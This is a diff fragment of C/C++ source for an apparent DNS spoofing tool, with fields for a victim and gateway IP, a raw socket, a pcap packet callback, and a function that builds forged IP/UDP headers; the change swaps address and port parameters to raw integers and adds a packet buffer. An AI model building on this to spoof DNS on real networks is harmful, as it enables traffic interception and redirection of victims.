@@ -12,14 +12,15 @@ struct DnsSniffArgs {
     struct in_addr *victimIp;
     struct in_addr *gatewayIP;
     int rawSocket;
+    unsigned char buffer[1500];
 };
 
 void dnsSpoof(struct DnsSniffArgs *args);
 void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
                   const unsigned char *packet);
 
-inline void fillIpUdpHeader(unsigned char *buffer, const struct in_addr &src,
-                            const struct in_addr &dst, const unsigned short sport,
+inline void fillIpUdpHeader(unsigned char *buffer, const unsigned int src,
+                            const unsigned int dst, const unsigned short sport,
                             const unsigned short dport, const int payloadSize) {
     struct iphdr *ipBuffer = (struct iphdr *)buffer;
     struct udphdr *udpBuffer = (struct udphdr *)(buffer + 20);
@@ -31,11 +32,11 @@ inline void fillIpUdpHeader(unsigned char *buffer, const struct in_addr &src,
     ipBuffer->ttl = 64;
     ipBuffer->protocol = IPPROTO_UDP;
     ipBuffer->check = 0;
-    ipBuffer->saddr = htonl(src.s_addr);
-    ipBuffer->daddr = htonl(dst.s_addr);
+    ipBuffer->saddr = src;
+    ipBuffer->daddr = dst;
     ipBuffer->check = in_cksum((unsigned short *)ipBuffer, 20);
-    udpBuffer->source = htons(sport);
-    udpBuffer->dest = htons(dport);
+    udpBuffer->source = sport;
+    udpBuffer->dest = dport;
     udpBuffer->len = htons(8 + payloadSize);
     struct UdpPseudoHeader pseudo_header;
     pseudo_header.srcAddr = ipBuffer->saddr;
